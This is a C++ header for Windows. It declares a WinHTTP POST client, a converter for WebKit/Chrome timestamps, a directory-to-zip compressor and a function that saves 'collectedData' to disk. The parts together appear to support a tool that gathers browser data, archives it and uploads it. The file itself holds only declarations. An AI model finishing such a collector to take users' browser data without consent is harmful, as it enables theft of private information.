#pragma once

#include <winsock2.h>
#include <windows.h>
#include <winhttp.h>
#include <string>
#include <memory>
#include <fstream>
#include <vector>
#include <unordered_map>
#include <stdexcept>

#include "miniz.h"

#pragma comment(lib, "Ws2_32.lib")
#pragma comment(lib, "Winhttp.lib")

struct WinHTTPHandleDeleter {
    void operator()(HINTERNET h) const {
        if (h) WinHttpCloseHandle(h);
    }
};

using WinHTTPHandle = std::unique_ptr<std::remove_pointer_t<HINTERNET>, WinHTTPHandleDeleter>;

struct HTTPResponse {
    bool success;
    DWORD statusCode;
    std::string body;
};

class HTTPClient {
public:
    virtual ~HTTPClient() = default;
    virtual HTTPResponse post(const std::wstring& host,
        const std::wstring& path,
        const std::wstring& headers,
        const std::string& data) = 0;
};

class WinHTTPClient : public HTTPClient {
public:
    HTTPResponse post(const std::wstring& host,
        const std::wstring& path,
        const std::wstring& headers,
        const std::string& data) override;
};

inline std::wstring webkitTimestampToWString(long long timestamp) {
    const long long SEC_TO_UNIX_EPOCH = 11644473600LL;
    long long unix_time = (timestamp / 1000000LL) - SEC_TO_UNIX_EPOCH;
    time_t t = static_cast<time_t>(unix_time);

    struct tm tm_info;
    if (gmtime_s(&tm_info, &t) != 0) {
        return L"Invalid Time";
    }

    wchar_t buffer[100];
    swprintf_s(buffer, L"%04d-%02d-%02d %02d:%02d:%02d",
        tm_info.tm_year + 1900,
        tm_info.tm_mon + 1,
        tm_info.tm_mday,
        tm_info.tm_hour,
        tm_info.tm_min,
        tm_info.tm_sec);
    return std::wstring(buffer);
}

std::wstring stringToWString(const std::string& str);
std::string wstringToString(const std::wstring& wstr);
std::wstring trim(const std::wstring& s);
std::string urlEncode(const std::wstring& value);

bool compressDirectoryToZip(const std::wstring& folderPath, const std::wstring& zipPath);

std::wstring saveDataToDirectory(
    const std::unordered_map<std::wstring, std::unordered_map<std::wstring, std::wstring>>& collectedData);
